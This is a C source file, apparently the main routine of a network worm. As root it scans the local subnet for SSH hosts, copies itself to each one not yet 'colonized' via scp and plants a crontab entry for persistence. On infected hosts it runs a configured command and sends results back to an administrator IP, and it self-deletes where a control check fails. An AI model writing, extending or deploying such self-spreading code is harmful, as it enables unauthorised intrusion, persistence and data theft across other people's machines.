#include "../include/main.h"

int main (int argc, char **argv) {
	int ret = EXIT_FAILURE;
	int portSSH, cpt;
	char programPath[PATH_MAX];
	dictionary *dico;
	struct in_addr adminHost;
	char *programName, *adminIP, *command, *control, *dstPath, *crontab, *scpPath, *sshPath, *broadcast;
	struct in_addr *hostList = NULL;

	// get real path of the program
	realpath(argv[0], programPath);

	// get the program name
	programName = basename(argv[0]);

	// go into the program directory
	chdir(dirname(argv[0]));

	// read and check the configuration file
	dico = GetConfig();
	adminIP = iniparser_getstring(dico, "Administrator:ip", NULL);
	command = iniparser_getstring(dico, "Administrator:command", NULL);
	control = iniparser_getstring(dico, "Target:control", NULL);
	dstPath = iniparser_getstring(dico, "Target:targetPath", NULL);
	crontab = iniparser_getstring(dico, "Target:crontab", NULL);
	scpPath = iniparser_getstring(dico, "Network:scp", NULL);
	sshPath = iniparser_getstring(dico, "Network:ssh", NULL);
	portSSH = iniparser_getint(dico, "Network:portSSH", -1);
	broadcast = iniparser_getstring(dico, "Network:broadcast", NULL);

	// if the user is root
	if (isRoot()) {
		// if the host is the administrator
		if(isSourceHost(adminIP)) {
			hostList = scanNetwork(adminIP, broadcast, portSSH);
			inet_aton(adminIP, &adminHost);
			cpt = 0;
			while (1) {
				// if the target host and the administrator host are in the same subnet
				if (inet_netof(hostList[cpt]) == inet_netof(adminHost)) {
					// if the host is not colonized
					if (!isAlreadyColonized(inet_ntoa(hostList[cpt]), programName, sshPath, portSSH, dstPath)) {
						// colonize the host
						colonize(inet_ntoa(hostList[cpt]), sshPath, portSSH, scpPath, programPath, dstPath, crontab);
					}
				}
				else
					break;
				cpt++;
			}
		}
		else {
			// if the host is authorized
			if (isAuthorized(control))
				informationsRecovery(command, dstPath, control, adminIP, scpPath, portSSH);
			else
				// delete program, configuration file and restore crontab
				wormDelete(programName, dstPath, crontab);
		}
		ret = EXIT_SUCCESS;	
	}
	iniparser_freedict(dico);

	return ret;
}

